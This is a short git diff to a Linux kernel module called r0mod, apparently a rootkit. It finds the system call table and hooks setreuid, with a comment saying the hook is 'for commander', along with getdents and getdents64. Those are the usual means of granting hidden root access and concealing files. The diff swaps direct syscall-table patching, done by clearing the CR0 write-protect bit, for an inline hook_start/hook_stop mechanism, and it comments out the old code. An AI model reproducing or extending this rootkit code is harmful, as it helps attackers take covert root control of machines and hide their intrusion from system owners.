@@ -91,6 +91,17 @@ static int __init r0mod_init(void)
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
 
     DEBUG("Hooking setreuid for commander!\n");
+
+    orig_setreuid = (void *)sct[__NR_setreuid];
+    hook_start(orig_setreuid, &new_setreuid);
+
+    orig_getdents = (void *)sct[__NR_getdents];
+    hook_start(orig_getdents, &new_getdents);
+
+    orig_getdents64 = (void *)sct[__NR_getdents64];
+    hook_start(orig_getdents64, &new_getdents64);
+
+/*
     write_cr0(read_cr0() & (~0x10000));
 
     orig_setreuid = (void *)sct[__NR_setreuid];
@@ -99,6 +110,7 @@ static int __init r0mod_init(void)
     sct[__NR_getdents] = (unsigned long)new_getdents;
 
     write_cr0(read_cr0() | 0x10000);
+*/
 
     return 0;
 }
@@ -109,12 +121,17 @@ static void __exit r0mod_exit(void)
 
     if(sct != NULL)
     {
+        hook_stop(orig_setreuid);
+        hook_stop(orig_getdents);
+        hook_stop(orig_getdents64);
+/*
         write_cr0(read_cr0() & (~0x10000));
 
         sct[__NR_setreuid] = (unsigned long)orig_setreuid;
         sct[__NR_getdents] = (unsigned long)orig_getdents;
 
         write_cr0(read_cr0() | 0x10000);
+*/
     }
 }
 
